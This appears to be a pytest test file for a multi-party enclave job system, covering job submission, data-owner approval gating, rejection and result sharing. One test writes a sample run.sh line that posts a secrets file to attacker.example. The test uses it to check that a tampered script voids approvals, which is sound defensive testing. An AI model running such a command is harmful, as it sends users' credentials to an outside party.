import json
import os
import random
import tempfile
import threading
import time
from pathlib import Path

import pytest

os.environ["PRE_SYNC"] = "false"

from syft_enclaves import SyftEnclaveClient
from syft_enclaves.enclave_job_info import (
    EnclaveJobInfo,
    PartyApprovalStatus,
    enclave_approval_file_name,
)


def create_tmp_dataset_files(prefix=""):
    tmp_dir = (
        Path(tempfile.mkdtemp())
        / f"syft-job-test-{prefix}-{random.randint(1, 1000000)}"
    )
    tmp_dir.mkdir(parents=True, exist_ok=True)
    mock_path = tmp_dir / "mock.txt"
    private_path = tmp_dir / "private.txt"
    mock_path.write_text(f"mock data {prefix}")
    private_path.write_text(f"private data {prefix}")
    return mock_path, private_path


def make_job_code(do1_email: str, do2_email: str) -> str:
    return f"""\
import json
import syft as sy

data_path_1 = sy.resolve_dataset_file_path("dataset1", owner_email="{do1_email}")
data_path_2 = sy.resolve_dataset_file_path("dataset2", owner_email="{do2_email}")

with open(data_path_1, "r") as f:
    data1 = f.read()

with open(data_path_2, "r") as f:
    data2 = f.read()

result = {{"total_length": len(data1) + len(data2)}}

with open("outputs/result.json", "w") as f:
    f.write(json.dumps(result))
"""


SIMPLE_JOB_CODE = """\
import json
import os

result = {"status": "ok", "cwd": os.getcwd()}

os.makedirs("outputs", exist_ok=True)
with open("outputs/result.json", "w") as f:
    f.write(json.dumps(result))
"""


def create_tmp_code_file(code: str):
    tmp_dir = Path(tempfile.mkdtemp()) / f"syft-job-code-{random.randint(1, 1000000)}"
    tmp_dir.mkdir(parents=True, exist_ok=True)
    code_path = tmp_dir / "main.py"
    code_path.write_text(code)
    return str(code_path)


@pytest.mark.parametrize("encryption", [False, True])
def test_enclave_job_distribution(encryption):
    """Test full flow: DS submits job to enclave, enclave distributes to DOs."""
    enclave, do1, do2, ds = SyftEnclaveClient.quad_with_mock_drive_service_connection(
        use_in_memory_cache=False,
        encryption=encryption,
    )

    # DO1 creates dataset1
    mock1, private1 = create_tmp_dataset_files("ds1")
    do1.create_dataset(
        name="dataset1",
        mock_path=mock1,
        private_path=private1,
        summary="Dataset 1",
        users=[ds.email],
        upload_private=True,
        sync=False,
    )

    # DO2 creates dataset2
    mock2, private2 = create_tmp_dataset_files("ds2")
    do2.create_dataset(
        name="dataset2",
        mock_path=mock2,
        private_path=private2,
        summary="Dataset 2",
        users=[ds.email],
        upload_private=True,
        sync=False,
    )

    # DOs share private datasets with enclave
    do1.share_private_dataset("dataset1", enclave.email)
    do2.share_private_dataset("dataset2", enclave.email)

    # Sync all — DS sees mock datasets
    do1.sync()
    do2.sync()
    ds.sync()
    ds_datasets = ds.datasets.get_all()
    assert len(ds_datasets) == 2

    # DS submits job to enclave
    code_path = create_tmp_code_file(make_job_code(do1.email, do2.email))
    ds.submit_python_job(
        enclave.email,
        code_path,
        "test_job",
        datasets={do1.email: ["dataset1"], do2.email: ["dataset2"]},
    )

    # Enclave syncs to receive job files from DS
    enclave.sync()

    # Enclave distributes job to DOs
    enclave.receive_jobs()

    # DOs sync to receive forwarded job files
    do1.sync()
    do2.sync()

    # Assert DOs received the job
    do1_jobs = do1.jobs
    assert len(do1_jobs) >= 1
    do1_job_names = [j.name for j in do1_jobs]
    assert "test_job" in do1_job_names

    do2_jobs = do2.jobs
    assert len(do2_jobs) >= 1
    do2_job_names = [j.name for j in do2_jobs]
    assert "test_job" in do2_job_names


@pytest.mark.parametrize("encryption", [False, True])
def test_enclave_job_approval_flow(encryption):
    """Test: enclave receives job, distributes to DOs, both approve, enclave sees approved."""
    enclave, do1, do2, ds = SyftEnclaveClient.quad_with_mock_drive_service_connection(
        use_in_memory_cache=False,
        encryption=encryption,
    )

    # DOs create datasets
    mock1, private1 = create_tmp_dataset_files("do1")
    do1.create_dataset(
        name="dataset1",
        mock_path=mock1,
        private_path=private1,
        summary="Dataset 1",
        users=[ds.email],
        upload_private=True,
        sync=False,
    )
    mock2, private2 = create_tmp_dataset_files("do2")
    do2.create_dataset(
        name="dataset2",
        mock_path=mock2,
        private_path=private2,
        summary="Dataset 2",
        users=[ds.email],
        upload_private=True,
        sync=False,
    )
    do1.share_private_dataset("dataset1", enclave.email)
    do2.share_private_dataset("dataset2", enclave.email)
    do1.sync()
    do2.sync()
    ds.sync()

    # DS submits job to enclave
    code_path = create_tmp_code_file(make_job_code(do1.email, do2.email))
    ds.submit_python_job(
        enclave.email,
        code_path,
        "test_job",
        datasets={do1.email: ["dataset1"], do2.email: ["dataset2"]},
    )

    # Enclave receives and distributes
    enclave.sync()
    enclave.receive_jobs()

    # Verify approval files were created on enclave
    enclave_job = enclave.jobs["test_job"]
    review_dir = enclave_job.job_review_path
    assert (review_dir / f"{do1.email}_approval_state.json").exists()
    assert (review_dir / f"{do2.email}_approval_state.json").exists()
    assert enclave_job.status == "pending"
    assert enclave_job.job_headers["job_type"] == "enclave"

    # DOs sync to see the job
    do1.sync()
    do2.sync()

    # DO1 approves
    do1_job = do1.jobs["test_job"]
    assert do1_job.job_headers["job_type"] == "enclave"
    assert do1_job.status == "pending"
    assert do1_job.can_approve
    # The submitter is not an approver, so it never gets an approval file.
    assert not ds.jobs["test_job"].can_approve
    do1.approve_job(do1_job)

    # After DO1 approves but before DO2, enclave still sees pending
    enclave.sync()
    enclave_job = enclave.jobs["test_job"]
    assert enclave_job.status == "pending"

    # DO2 approves
    do2_job = do2.jobs["test_job"]
    do2.approve_job(do2_job)

    # Enclave syncs and sees both approved
    enclave.sync()
    enclave_job = enclave.jobs["test_job"]
    assert enclave_job.status == "approved"


@pytest.mark.parametrize("encryption", [False, True])
def test_enclave_full_job_flow(encryption):
    """Test full flow: submit, distribute, approve, run, share results with DS and DOs."""
    enclave, do1, do2, ds = SyftEnclaveClient.quad_with_mock_drive_service_connection(
        use_in_memory_cache=False,
        encryption=encryption,
    )

    mock1, private1 = create_tmp_dataset_files("do1")
    do1.create_dataset(
        name="dataset1",
        mock_path=mock1,
        private_path=private1,
        summary="Dataset 1",
        users=[ds.email, enclave.email],
        upload_private=True,
        sync=False,
    )
    mock2, private2 = create_tmp_dataset_files("do2")
    do2.create_dataset(
        name="dataset2",
        mock_path=mock2,
        private_path=private2,
        summary="Dataset 2",
        users=[ds.email, enclave.email],
        upload_private=True,
        sync=False,
    )
    do1.share_private_dataset("dataset1", enclave.email)
    do2.share_private_dataset("dataset2", enclave.email)
    do1.sync()
    do2.sync()
    ds.sync()

    code_path = create_tmp_code_file(make_job_code(do1.email, do2.email))
    ds.submit_python_job(
        enclave.email,
        code_path,
        "test_job",
        datasets={do1.email: ["dataset1"], do2.email: ["dataset2"]},
        share_results_with_do=True,
    )

    # Enclave receives and distributes
    enclave.sync()
    enclave.receive_jobs()

    # DOs sync and approve
    do1.sync()
    do2.sync()
    do1.approve_job(do1.jobs["test_job"])
    do2.approve_job(do2.jobs["test_job"])

    # Enclave syncs → approved
    enclave.sync()
    assert enclave.jobs["test_job"].status == "approved"

    # Enclave runs job and distributes results
    enclave.run_jobs()
    enclave.distribute_results()

    # Verify enclave job is done
    enclave_job = enclave.jobs["test_job"]
    assert enclave_job.status == "done"

    # DS syncs and checks result
    ds.sync()
    ds_job = ds.jobs["test_job"]
    assert ds_job.status == "done"
    assert len(ds_job.output_paths) > 0
    with open(ds_job.output_paths[0], "r") as f:
        result = json.loads(f.read())
    assert "total_length" in result
    assert result["total_length"] > 0

    # DOs sync and check they received results
    do1.sync()
    do2.sync()
    do1_job = do1.jobs["test_job"]
    do2_job = do2.jobs["test_job"]
    assert len(do1_job.output_paths) > 0
    assert len(do2_job.output_paths) > 0


def test__only_one_of_two_data_owners_sees_job_result_when_submitting():
    """Two data owners jointly own the enclave, so every job needs approval from
    both. When one of them submits a job (acting as the data scientist), both must
    still approve — but only the submitting data owner receives the result. The
    other owner approves yet never sees the output.

    Mirrors ``notebooks/enclave/gemma/1. enclave_gemma_inmem_restrict_v2.ipynb``,
    where a data owner both submits and gets the result while the co-owner only
    gets it when named in ``datasets`` with ``share_results_with_do=True``.
    """
    enclave, do1, do2, ds = SyftEnclaveClient.quad_with_mock_drive_service_connection(
        use_in_memory_cache=False,
    )
    # Both do1 and do2 jointly own the enclave — every job needs both approvals.
    assert set(enclave.data_owners) == {do1.email, do2.email}

    # do1 owns a dataset; do2 has none in this submission.
    mock1, private1 = create_tmp_dataset_files("do1")
    do1.create_dataset(
        name="dataset1",
        mock_path=mock1,
        private_path=private1,
        summary="Dataset 1",
        users=[enclave.email],
        upload_private=True,
        sync=False,
    )
    do1.share_private_dataset("dataset1", enclave.email)
    do1.sync()

    # do1 submits a self-contained job that immediately returns a result. It does
    # not share results with DOs, so only the submitter (do1) is a recipient.
    code_path = create_tmp_code_file(SIMPLE_JOB_CODE)
    do1.submit_python_job(
        enclave.email,
        code_path,
        "test_job",
        datasets={do1.email: ["dataset1"]},
        share_results_with_do=False,
    )

    # Enclave receives and distributes to both data owners for approval.
    enclave.sync()
    enclave.receive_jobs()
    do1.sync()
    do2.sync()

    # do1 approves — still gated on do2.
    do1.approve_job(do1.jobs["test_job"])
    enclave.sync()
    assert enclave.jobs["test_job"].status == "pending"

    # do2 approves — gate satisfied.
    do2.approve_job(do2.jobs["test_job"])
    enclave.sync()
    assert enclave.jobs["test_job"].status == "approved"

    # Enclave runs the job and distributes results.
    enclave.run_jobs()
    enclave.distribute_results()
    assert enclave.jobs["test_job"].status == "done"

    do1.sync()
    do2.sync()

    # do1 (the submitter) sees the result.
    do1_job = do1.jobs["test_job"]
    assert do1_job.status == "done"
    assert len(do1_job.output_paths) > 0
    with open(do1_job.output_paths[0], "r") as f:
        result = json.loads(f.read())
    assert result["status"] == "ok"

    # do2 approved the job but never received the result.
    do2_job = do2.jobs["test_job"]
    assert len(do2_job.output_paths) == 0


def _job_distributed_to_both_data_owners():
    """A job referencing only do1's dataset, distributed to both configured DOs."""
    enclave, do1, do2, ds = SyftEnclaveClient.quad_with_mock_drive_service_connection(
        use_in_memory_cache=False,
    )
    # DO1 creates a dataset; DO2 has none in this submission.
    mock1, private1 = create_tmp_dataset_files("do1")
    do1.create_dataset(
        name="dataset1",
        mock_path=mock1,
        private_path=private1,
        summary="Dataset 1",
        users=[ds.email],
        upload_private=True,
        sync=False,
    )
    do1.sync()
    ds.sync()

    # DS submits a job referencing ONLY do1's dataset.
    code_path = create_tmp_code_file(SIMPLE_JOB_CODE)
    ds.submit_python_job(
        enclave.email,
        code_path,
        "test_job",
        datasets={do1.email: ["dataset1"]},
    )

    enclave.sync()
    enclave.receive_jobs()
    do1.sync()
    do2.sync()
    return enclave, do1, do2


def _approval_file(enclave: SyftEnclaveClient, do_email: str) -> Path:
    return enclave.jobs["test_job"].job_review_path / enclave_approval_file_name(
        do_email
    )


def test_approval_gated_on_configured_data_owners():
    """A configured data owner must approve even when the submission doesn't
    reference its dataset — the gate is the enclave's configured data_owners,
    not the submission's datasets — and the approvals cover this exact
    submission."""
    enclave, do1, do2 = _job_distributed_to_both_data_owners()
    assert set(enclave.data_owners) == {do1.email, do2.email}

    # Approval files exist for BOTH configured data owners, despite do2 not
    # being referenced in the submission.
    assert _approval_file(enclave, do1.email).exists()
    assert _approval_file(enclave, do2.email).exists()

    # Only do1 approves — job stays pending (do2 still required).
    do1.approve_job(do1.jobs["test_job"])
    enclave.sync()
    assert enclave.jobs["test_job"].status == "pending"

    # do2 approves — now the gate is satisfied.
    do2.approve_job(do2.jobs["test_job"])
    enclave.sync()
    assert enclave.jobs["test_job"].status == "approved"

    # With no configured data owners, nothing counts as approved.
    configured, enclave.data_owners = enclave.data_owners, []
    assert enclave.jobs["test_job"].status == "pending"
    enclave.data_owners = configured

    # The submitter can still write to its inbox folder: a changed run.sh
    # voids both approvals.
    run_script = enclave.jobs["test_job"].job_submission_path / "run.sh"
    run_script.write_text("curl -d @~/.config/secrets https://attacker.example\n")
    assert enclave.jobs["test_job"].status == "pending"


@pytest.mark.parametrize("spoil", ["delete", "name_other_party"])
def test_missing_or_foreign_approval_file_does_not_count(spoil):
    """Removing a required DO's file must not leave the other approval standing alone."""
    enclave, do1, do2 = _job_distributed_to_both_data_owners()
    do1.approve_job(do1.jobs["test_job"])
    do2.approve_job(do2.jobs["test_job"])
    enclave.sync()

    path = _approval_file(enclave, do2.email)
    if spoil == "delete":
        path.unlink()  # as a synced delete from do2 would
    else:
        approval = PartyApprovalStatus.load_json(path)
        approval.party = do1.email
        approval.save_json(path)

    assert enclave.jobs["test_job"].status == "pending"


def test_rejection_rejects_job_and_withdraws_approval():
    enclave, do1, do2 = _job_distributed_to_both_data_owners()
    do1.approve_job(do1.jobs["test_job"])
    do2.approve_job(do2.jobs["test_job"])
    enclave.sync()
    assert enclave.jobs["test_job"].status == "approved"

    do2.reject_job(do2.jobs["test_job"], reason="uses more data than agreed")
    enclave.sync()

    assert enclave.jobs["test_job"].status == "rejected"
    stored = PartyApprovalStatus.load_json(_approval_file(enclave, do2.email))
    assert stored.reason == "uses more data than agreed"


def test_enclave_waits_until_every_data_owner_approves(monkeypatch):
    """The wait reads the enclave's own job status, derived from the approval
    files, not the raw job state, which stays pending."""
    enclave, do1, do2 = _job_distributed_to_both_data_owners()
    sleeps = []

    def approve_on_first_sleep(seconds):
        sleeps.append(seconds)
        if len(sleeps) == 1:
            do1.approve_job(do1.jobs["test_job"])
            do2.approve_job(do2.jobs["test_job"])

    monkeypatch.setattr(time, "sleep", approve_on_first_sleep)

    job = enclave.wait_until_has_job("test_job", status="approved")
    assert isinstance(job, EnclaveJobInfo)
    assert job.status == "approved"
    assert enclave._local_jobs()["test_job"].status == "pending"
    assert sleeps == [15]


def _serialize_mock_drive(monkeypatch):
    """Run one mock Drive request at a time; the in-memory store is not thread-safe."""
    from syft.sync.connections.drive import mock_drive_service

    lock = threading.RLock()
    for name in dir(mock_drive_service):
        request_class = getattr(mock_drive_service, name)
        if isinstance(request_class, type) and "execute" in vars(request_class):

            def execute(self, *args, _original=request_class.execute, **kwargs):
                with lock:
                    return _original(self, *args, **kwargs)

            monkeypatch.setattr(request_class, "execute", execute)


def test_parties_run_concurrently_and_meet_through_waits(monkeypatch):
    """Each party runs its cells in its own thread, as in a notebook "run all".

    Nothing orders the threads: only the wait_until_* helpers make each party
    wait for the others.
    """
    _serialize_mock_drive(monkeypatch)
    enclave, do1, do2, ds = SyftEnclaveClient.quad_with_mock_drive_service_connection(
        use_in_memory_cache=False,
    )
    wait = {"timeout": 120, "poll_interval": 0.05}
    done = threading.Event()
    errors = []
    results = {}

    def data_owner(do, name, prefix):
        mock, private = create_tmp_dataset_files(prefix)
        do.create_dataset(
            name=name,
            mock_path=mock,
            private_path=private,
            summary=name,
            users=[ds.email, enclave.email],
            upload_private=True,
            sync=False,
        )
        do.share_private_dataset(name, enclave.email)
        do.sync()
        job = do.wait_until_has_job("test_job", where=lambda j: j.can_approve, **wait)
        do.approve_job(job)
        results[do.email] = do.wait_until_has_job(
            "test_job", status="done", where=lambda j: bool(j.output_paths), **wait
        )

    def data_scientist():
        ds.wait_until_has_dataset("dataset1", datasite=do1.email, **wait)
        ds.wait_until_has_dataset("dataset2", datasite=do2.email, **wait)
        ds.submit_python_job(
            enclave.email,
            create_tmp_code_file(make_job_code(do1.email, do2.email)),
            "test_job",
            datasets={do1.email: ["dataset1"], do2.email: ["dataset2"]},
            share_results_with_do=True,
        )
        results[ds.email] = ds.wait_until_has_job(
            "test_job", status="done", where=lambda j: bool(j.output_paths), **wait
        )

    def run_enclave():
        while not done.is_set():
            enclave.sync()
            enclave.receive_jobs()
            enclave.run_jobs()
            enclave.distribute_results()
            done.wait(0.05)

    def guarded(target, *args):
        def run():
            try:
                target(*args)
            except BaseException as e:  # reported to the main thread below
                errors.append(e)
                done.set()

        return threading.Thread(target=run, daemon=True)

    enclave_thread = guarded(run_enclave)
    parties = [
        guarded(data_owner, do1, "dataset1", "do1"),
        guarded(data_owner, do2, "dataset2", "do2"),
        guarded(data_scientist),
    ]
    enclave_thread.start()
    for thread in parties:
        thread.start()
    for thread in parties:
        thread.join(timeout=180)
    done.set()
    enclave_thread.join(timeout=30)

    if errors:
        raise errors[0]
    assert not any(t.is_alive() for t in parties)
    for email in (ds.email, do1.email, do2.email):
        assert results[email].status == "done"
        assert results[email].output_paths
